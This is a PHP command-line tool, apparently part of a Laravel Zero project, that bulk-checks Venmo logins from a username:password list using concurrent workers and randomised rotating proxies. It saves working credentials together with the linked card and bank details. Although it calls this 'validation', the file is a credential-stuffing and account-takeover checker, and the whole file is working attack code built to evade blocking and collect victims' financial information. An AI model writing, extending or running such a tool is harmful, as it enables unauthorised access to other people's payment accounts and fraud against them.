<?php

namespace App\Commands\Venmo;

use App\Services\Venmo\Enums\LoginStatus;
use App\Services\Venmo\Venmo;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\File;
use LaravelZero\Framework\Commands\Command;
use Spatie\Fork\Fork;
use function Termwind\render;

class AccountCheckCommand extends Command
{
    protected $signature = 'venmo:validate 
        {--accountList=list.txt : Path to the file containing the list of Venmo accounts to validate} 
        {--proxy= : Proxy configuration to use. Use [random(length)] to generate a random string. Example: socks5://user-s-[random(10)]:pass@host:port}
        {--threadCount=10 : Number of concurrent threads to use during validation}';
    protected $description = 'Performs a bulk validation of Venmo accounts. Validates if each account in the provided list is a legitimate Venmo account.';

    protected string $resultDir = 'results';

    public function handle(): void
    {
        $this->resultDir = getcwd() . '/' . $this->resultDir;

        if (!is_dir(filename: $this->resultDir)) {
            @mkdir($this->resultDir, 0777, true);
        }

        $accountListFilePath = $this->option(key: 'accountList');
        $accountCollection = $this->parseAccountListFromFile(listFilePath: $accountListFilePath);

        render(html: '<div class="pl-2 py-2 text-green-300">Initiating the process to validate Venmo accounts...</div>');

        Fork::new()
            ->concurrent(concurrent: (int)$this->option(key: 'threadCount'))
            ->run(...$this->prepareValidationTasks(accountCollection: $accountCollection));

        render(html: '<div class="pl-2 py-2 text-green-300">Finished validating Venmo accounts.</div>');
    }

    protected function parseAccountListFromFile(string $listFilePath): Collection
    {
        return collect(
            value: (array)File::lines(path: $listFilePath)
                ->map(callback: fn($line) => explode(separator: ':', string: $line))
                ->filter(callback: fn($accountParts) => count(value: $accountParts) === 2)
                ->map(callback: fn($accountParts) => [
                    'user_id' => $accountParts[0] ?? null,
                    'password' => $accountParts[1] ?? null,
                ])
                ->filter(callback: fn($account) => $account['user_id'] !== null && $account['password'] !== null)
                ->toArray()
        );
    }

    protected function prepareValidationTasks(Collection $accountCollection): array
    {
        return $accountCollection->map(callback: fn($account) => function () use ($account) {
            $proxy = $this->option('proxy') ? $this->generateRandomProxy(input: $this->option('proxy')) : null;

            $venmoService = new Venmo(
                user_id: $account['user_id'],
                password: $account['password'],
                proxy: $proxy
            );

            $startTime = microtime(true);

            $validationResult = $venmoService->handle();
            $validationStatus = $validationResult->getStatus();
            $validationUserAdditionalData = collect($validationResult->getAdditionalData());

            $loginCard = $validationUserAdditionalData->get('card', '');
            $loginBank = $validationUserAdditionalData->get('bank', '');

            $executionTime = microtime(true) - $startTime;

            $proxyOutput = $proxy
                ? "<span class=\"text-yellow-500\">{$proxy} ({$executionTime} second)</span>"
                : '';

            $loginCardOutput = $loginCard
                ? "<span class=\"text-green-500\">Card: {$loginCard}</span>"
                : '';

            $loginBankOutput = $loginBank
                ? "<span class=\"text-blue-500\">Bank: {$loginBank}</span>"
                : '';

            $additionalDataOutput = $validationStatus === LoginStatus::VALID ? <<<HTML
                {$loginCardOutput}
                {$loginBankOutput}
            HTML: '';


            $htmlOutput = <<<HTML
                <div class="space-x-2 pl-2">
                    <span class="{$validationStatus->getTextColor()} w-8">{$validationStatus->getStatusText()}</span>
                    <span class="text-gray-500 w-32">{$account['user_id']}</span>
                    <span class="text-gray-500 w-32">{$account['password']}</span>
                    {$proxyOutput}
                    {$additionalDataOutput}
                </div>
            HTML;

            @file_put_contents(
                filename: $this->resultDir . '/' . $validationStatus->getStatusText() . '.txt',
                data: "{$account['user_id']}:{$account['password']} : Card {$loginCard} : Bank {$loginBank} : Message {$validationResult->getMessage()}\n",
                flags: FILE_APPEND
            );

            render(html: $htmlOutput);
        })->toArray();
    }

    protected function generateRandomProxy(string $input): string
    {
        return (string)preg_replace_callback(
            pattern: '/\[random\(([0-9]+)\)]/',
            callback: fn($matches) => bin2hex(string: random_bytes(length: (int)$matches[1])),
            subject: $input
        );
    }
}
